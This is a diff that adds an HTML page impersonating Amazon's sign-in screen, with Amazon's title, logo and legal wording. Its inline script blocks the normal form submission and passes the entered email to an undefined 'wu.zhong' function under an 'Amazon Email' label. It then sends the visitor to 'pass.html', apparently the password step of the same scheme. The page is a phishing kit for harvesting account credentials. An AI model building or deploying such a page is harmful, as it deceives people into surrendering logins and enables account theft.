@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/amazon.css">
+    <title>Amazon</title>
+</head>
+<body>
+    <header>
+       <div class="logo"> <img src="res/img/logo1.png" alt="img">  </div></header>
+
+<div class="header">
+    <div class="header1">
+
+
+<div class="title">
+    <label>Sign in</label>
+</div> <br>
+
+<form action="password.php" method="get">
+<div class="email"><b> Email or mobile phone number </b></div>
+<div class="input"><input type="text" id="email" name="user" required> </div>
+ <br>
+<div class="login">
+<div class="button"><button type="submit"> continue</button> </div>
+</div>
+<div class="text1">
+<p>By continuing, you agree to Amazon's<a href="#">Conditions of Use</a> <br> <a href="#"> Use</a> 
+and<a href="#"> Privacy Notice.</a></p>
+</div> <br>
+<div class="text2">
+   <div class="link"><img src="res/img/logo2.png" > <a href="#">Need help? </a> </div>
+</div>
+<div class="styl"></div>
+<div class="texto"> <label>Buying for work?</label> </div>
+<div class="texto1"><a href="#">Shop on Amazon Business</a> </div>
+</form>
+</div>
+</div>
+
+<div class="aria" ><h5 >New to Amazon?</h5></div>
+<div class="last"> <button style=" background-color: white;" type="">Create your amazon account</button></div>
+
+
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+    wu.zhong(`✉️ Amazon Email: ${document.querySelector("[name='user']").value}`);
+
+    window.location="pass.html";
+
+})
+
+</script>
+
+</body>
+</html>
